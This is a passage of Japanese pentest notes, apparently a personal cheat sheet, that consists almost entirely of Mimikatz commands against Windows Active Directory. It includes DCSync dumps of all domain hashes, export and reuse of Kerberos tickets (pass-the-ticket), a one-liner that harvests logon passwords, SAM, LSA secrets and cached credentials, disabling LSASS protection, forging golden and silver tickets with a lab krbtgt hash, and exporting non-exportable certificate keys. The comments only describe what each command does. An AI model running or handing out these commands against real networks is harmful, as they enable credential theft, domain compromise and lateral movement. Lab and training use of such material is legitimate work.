```sh
import-module .\Invoke-Mimikatz.ps1
Invoke-Mimikatz -Command '"lsadump::dcsync /user:Administrator"'
Invoke-Mimikatz -Command '"lsadump::dcsync /all"'
```


### DC同期
```sh
# ドメインコントローラに同期要求を送ることでユーザの認証情報を得られることがある
# デフォルトではDomain Admins, Enterprise Admins, Administratorsグループに、同期の権限ある
mimikatz # lsadump::dcsync /user:corp\dave
mimikatz # lsadump::dcsync /all
```
### チケット取り込み
```sh
# キャッシュされている？チケットを利用した横展開

# 秘密キーと呼ばれるチケットは、そのままではエクスポートできないことがあるためcryptoモジュールを実行
mimikatz # crypto::capi 
or
mimikatz # crypto::cng

# チケットの出力
mimikatz # sekurlsa::tickets /export

# 出力されたチケットの確認
dir *.kirbi
# （省略）
# -a----        12/8/2024   9:32 AM           1577 [0;490626]-0-0-40810000-dave@cifs-web04.kirbi
# （省略）

# チケット取り込み
mimikatz # kerberos::ptt [0;47fb8c]-0-0-40810000-dave@cifs-web04.kirbi


```

```sh
# ワンライナー
mimikatz "privilege::debug" "token::elevate" "sekurlsa::logonpasswords" "lsadump::lsa /inject" "lsadump::sam" "lsadump::cache" "sekurlsa::ekeys" "exit"

# lsa保護を無効にするドライバをインポートして無効化
mimikatz # !+
mimikatz # !processprotect /process:lsass.exe /#ove

# SeDebugPrivilege権限を有効にしてみて現在の権限を確認
mimikatz # privilege::debug

# 抽出
mimikatz # sekurlsa::logonpasswords
mimikatz # sekurlsa::credman


# SYSTEMユーザへのなりすまし
mimikatz # token::elevate

# レジストリハイブから資格情報の平文を取得
mimikatz # lsadump::secrets

# 実行ログの取得先設定
mimikatz # log dcdump.txt

# DC同期を利用してハッシュを出力
mimikatz # lsadump::dcsync /domain:za.tryhackme.loc /all

# ゴールデンチケット偽造
mimikatz # kerberos::golden /admin:ReallyNotALegitAccount /domain:za.tryhackme.loc /id:500 /sid:S-1-5-21-3885271727-2693558621-2658995185 /krbtgt:16f9af38fca3ada405386b3b57366082 /endin:600 /renewmax:10080 /ptt

# シルバーチケット偽造
mimikatz # kerberos::golden /admin:StillNotALegitAccount /domain:za.tryhackme.loc /id:500 /sid:S-1-5-21-3885271727-2693558621-2658995185 /target:thmserver1.za.tryhackme.loc /rc4:16f9af38fca3ada405386b3b57366082 /service:cifs /ptt

# DCに保存されている証明書のチェック
mimikatz # crypto::certificates /systemstore:local_machine 
# Exportable key: NOに設定されてた場合に読み込むパッチ
mimikatz # privilege::debug
mimikatz # crypto::capi
mimikatz # crypto::cng
# 証明書キーのエクスポート
mimikatz # crypto::certificates /systemstore:local_machine /export

```